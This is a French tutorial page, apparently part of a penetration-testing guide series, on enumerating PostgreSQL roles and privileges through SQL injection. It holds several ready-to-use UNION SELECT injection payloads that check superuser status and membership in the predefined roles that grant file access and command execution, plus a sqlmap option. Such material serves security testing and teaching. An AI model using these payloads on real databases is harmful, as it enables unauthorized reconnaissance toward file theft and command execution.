---
order: 6
title: "Énumérer les rôles et privilèges dans l'injection PostgreSQL"
description: "Lire le rôle PostgreSQL courant, son statut superutilisateur et ses octrois, pour décider si les primitives d'accès aux fichiers et d'exécution de commandes sont atteignables."
keywords:
  - privilèges PostgreSQL
  - is_superuser
  - pg_roles
  - has_table_privilege
  - pg_read_server_files
---

# Privilèges

Le rôle derrière l'injection décide jusqu'où elle va, l'énumération des privilèges suit donc la prise d'empreinte. La question principale est le statut superutilisateur :

```sql
' UNION SELECT current_setting('is_superuser'),NULL,NULL-- 
' UNION SELECT string_agg(rolname,','),NULL,NULL FROM pg_roles WHERE rolsuper-- 
```

Un superutilisateur peut lire et écrire des fichiers serveur et exécuter des programmes directement. Les colonnes d'attributs de rôle dans `pg_roles` (`rolsuper`, `rolcreaterole`, `rolcreatedb`, `rolbypassrls`) montrent ce que le rôle courant peut faire :

```sql
' UNION SELECT string_agg(rolname||':'||rolsuper::text||':'||rolcreaterole::text,','),NULL,NULL FROM pg_roles-- 
```

Sur PostgreSQL 11 et ultérieur, l'accès aux fichiers et aux programmes est aussi accordé via les rôles prédéfinis `pg_read_server_files`, `pg_write_server_files` et `pg_execute_server_program`, de sorte qu'un non-superutilisateur qui appartient à l'un d'eux atteint tout de même cette primitive. Testez l'appartenance avec `pg_has_role`, qui suit les octrois de rôle imbriqués (une simple jointure sur `pg_auth_members` manquerait un privilège hérité via un rôle intermédiaire) :

```sql
' UNION SELECT pg_has_role('pg_read_server_files','USAGE')::text||','||pg_has_role('pg_write_server_files','USAGE')::text||','||pg_has_role('pg_execute_server_program','USAGE')::text,NULL,NULL-- 
```

Les octrois au niveau objet viennent des fonctions `has_*_privilege` et de `information_schema.role_table_grants`, par exemple `has_table_privilege('users','SELECT')`. Connaître le rôle et ses octrois vous indique s'il faut poursuivre la lecture de fichiers, l'écriture de fichiers, l'exécution de commandes, ou rester sur l'extraction pure de données.

## Outils

- **sqlmap** : lit le rôle courant et ses privilèges avec `--privileges`.
- **psql** : client officiel pour interroger directement `pg_roles`, `is_superuser` et `pg_has_role`.

## Références

- PostgreSQL Documentation: `pg_roles`, predefined roles, access privilege functions
- OWASP Testing Guide: Testing for SQL Injection
